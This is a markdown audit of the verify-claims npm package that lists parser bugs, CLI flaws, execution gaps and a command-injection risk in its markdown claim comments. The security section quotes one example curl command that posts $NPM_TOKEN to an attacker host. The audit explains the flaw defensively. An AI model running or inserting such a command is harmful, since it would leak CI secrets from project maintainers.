# Codebase Audit: Verified Gaps, Bugs & Edge Cases in `@shrinivas-sn/verify-claims`

This document records the exact, verified technical findings, code bugs, edge cases, and architectural gaps discovered directly in the `@shrinivas-sn/verify-claims` (v0.1.2) codebase. It serves as an authoritative reference for future development and AI sessions.

---

## 1. Verified Bugs in Current Code

### 🐛 Bug 1: Hardcoded Version Inconsistency
* **File:** [`src/index.ts:1`](file:///E:/verify-claims/src/index.ts#L1)
* **Code:** `export const VERSION = "0.1.0";`
* **Defect:** The published `package.json` is at version `0.1.2`, but `src/index.ts` hardcodes `"0.1.0"`. Any consumer importing `VERSION` receives an outdated, incorrect version string.

### 🐛 Bug 2: `claimText` Bleeding on Consecutive Claims
* **File:** [`src/parseClaims.ts:27-33`](file:///E:/verify-claims/src/parseClaims.ts#L27-L33)
* **Code:**
  ```ts
  let claimText = "";
  for (let j = i + 1; j < lines.length; j++) {
    const next = lines[j].trim();
    if (next !== "") {
      claimText = next;
      break;
    }
  }
  ```
* **Defect:** If two claim comments appear back-to-back:
  ```markdown
  <!-- claim: npm run lint -->
  <!-- claim: npm test -->
  Build: passes
  ```
  The parser assigns the string `"<!-- claim: npm test -->"` as the `claimText` of the first claim. The parser does not filter out subsequent HTML comments when searching for the claim text.

### 🐛 Bug 3: CLI Argument Misinterpretation (`--help` / `--version` treated as Globs)
* **File:** [`src/cli.ts:8-18`](file:///E:/verify-claims/src/cli.ts#L8-L18)
* **Code:** `const patterns = process.argv.slice(2);` passed directly to `glob(patterns)`.
* **Defect:** Running `verify-claims --help` or `verify-claims -v` does not show help or version. Instead, `tinyglobby` treats `--help` as a glob pattern, finds 0 files, and the CLI exits with failure code `1`:
  `No files matched: --help`

### 🐛 Bug 4: Uncaught Crash on Read Permissions or Directory Arguments
* **File:** [`src/cli.ts:24`](file:///E:/verify-claims/src/cli.ts#L24)
* **Code:** `const markdown = readFileSync(file, "utf8");`
* **Defect:** If a glob pattern resolves to a directory or a file without read permissions, `readFileSync` throws an unhandled exception (`EISDIR` / `EACCES`), crashing the process with an unformatted Node stack trace.

---

## 2. Core Functional Gaps

### ⚠️ Gap 1: Zero Output Reporting on Failure (`stdio: "ignore"`)
* **File:** [`src/verify.ts:16`](file:///E:/verify-claims/src/verify.ts#L16)
* **Code:** `execSync(claim.command, { stdio: "ignore", timeout: timeoutMs });`
* **Finding:** All `stdout` and `stderr` streams are suppressed. When a claim fails, the user is only told `got exit code 1`. There is no error message, test log, or stack trace shown. The developer cannot know *why* the claim failed without manually opening a terminal and re-running the command.

### ⚠️ Gap 2: The Core Premise Gap — Doc Text is Never Verified
* **File:** [`src/verify.ts`](file:///E:/verify-claims/src/verify.ts) & [`src/cli.ts`](file:///E:/verify-claims/src/cli.ts)
* **Finding:** Although `parseClaims.ts` extracts `claimText`, neither `verify()` nor `cli.ts` ever evaluates it. The tool only checks if the command exits with code `0`.
  * *Example:* If documentation claims `Lint: 50 errors`, and `npm run lint` exits 0 (clean), the CLI reports `✓ line 2  npm run lint`. The document claim is factually false, but the tool reports it as passing.

### ⚠️ Gap 3: CWD / Monorepo Execution Context
* **File:** [`src/verify.ts:16`](file:///E:/verify-claims/src/verify.ts#L16)
* **Finding:** `execSync` is executed without a `cwd` option, meaning it always runs in `process.cwd()` (the terminal root). In monorepos (e.g., `packages/app/README.md`), a claim running `npm test` runs root tests instead of package tests, breaking doc verification in subdirectories.

### ⚠️ Gap 4: Sequential Synchronous Execution (`execSync`)
* **File:** [`src/verify.ts:16`](file:///E:/verify-claims/src/verify.ts#L16) & [`src/cli.ts:29-30`](file:///E:/verify-claims/src/cli.ts#L29-L30)
* **Finding:** Commands run serially in a blocking loop. If a project has 15 claims checking build, lint, and test scripts (each taking 5–10s), the CLI blocks the Node.js event loop for 100–150 seconds. There is no concurrency or async worker pool.

---

## 3. Security Vulnerabilities

### 🚨 Vulnerability: Arbitrary Command Execution (RCE in CI)
* **File:** [`src/verify.ts:16`](file:///E:/verify-claims/src/verify.ts#L16)
* **Code:** `execSync(claim.command, ...)`
* **Finding:** The package passes any string inside `<!-- claim: <command> -->` directly to the system shell.
  * In open-source repositories using GitHub Actions on pull requests (`pull_request_target` or standard CI), an untrusted external fork can modify a markdown file to inject malicious shell commands (e.g. `curl -X POST https://attacker.com -d "$NPM_TOKEN"` or arbitrary disk modifications).
  * There is no command allowlist, validation, or dry-run inspection mode.

---

## 4. Parser & Platform Edge Cases

### 🔍 Edge Case 1: Fragile Code Block Detection
* **File:** [`src/parseClaims.ts:8, 17-21`](file:///E:/verify-claims/src/parseClaims.ts#L8)
* **Code:** `const FENCE = /^(```|~~~)/;`
* **Finding:**
  1. If a markdown file uses indented code blocks (4 spaces or tabs), `parseClaims` does not recognize them as code fences and will execute comments written inside code examples.
  2. If a code block uses 4 backticks (````) containing nested 3 backticks (```), the toggle `inFence = !inFence` becomes desynchronized.
  3. If a comment is inside a blockquote (`> <!-- claim: npm test -->`), `trimmed.match(CLAIM_COMMENT)` fails because of the leading `>`.

### 🔍 Edge Case 2: Windows Absolute Paths in Globbing
* **File:** [`src/cli.ts:14`](file:///E:/verify-claims/src/cli.ts#L14) & [`test/cli.test.ts:9-11`](file:///E:/verify-claims/test/cli.test.ts#L9-L11)
* **Finding:** The package's own test suite notes:
  `// Absolute Windows paths break tinyglobby's matching`
  If a Windows user or IDE integration passes an absolute path (e.g. `E:\project\docs\*.md`), `tinyglobby` fails to resolve the files and the command fails.

### 🔍 Edge Case 3: Shell Portability (POSIX vs Windows CMD)
* **File:** [`src/verify.ts:16`](file:///E:/verify-claims/src/verify.ts#L16)
* **Finding:** Commands defined in Markdown documentation often assume Unix shells (e.g. `sleep 2`, `export FOO=1`, or POSIX piping `grep`). Running these claims on Windows developer machines without bash fails immediately.

---

## 5. Commercial-Grade Quality Comparison

| Feature | Standard Commercial Tools (ESLint, Vitest, Prettier) | Current `@shrinivas-sn/verify-claims` (v0.1.2) |
| :--- | :--- | :--- |
| **CLI Options** | Full `--help`, `--version`, `--config`, `--format` | None (any flag is parsed as a glob pattern) |
| **Execution** | Async / multi-worker parallel execution | Serial synchronous `execSync` |
| **Error Feedback** | Displays failing output, stack traces, and exit codes | Displays only `expected exit code 0, got exit code 1` (`stdio: ignore`) |
| **Working Directory** | Configurable (`--cwd` or relative to target file) | Fixed to `process.cwd()` |
| **Security Controls** | Sandboxed or restricted execution scope | Unsanitized shell execution of arbitrary markdown comments |
| **Validation Scope** | Deep semantic validation | Exit code 0 only (doc text is ignored) |
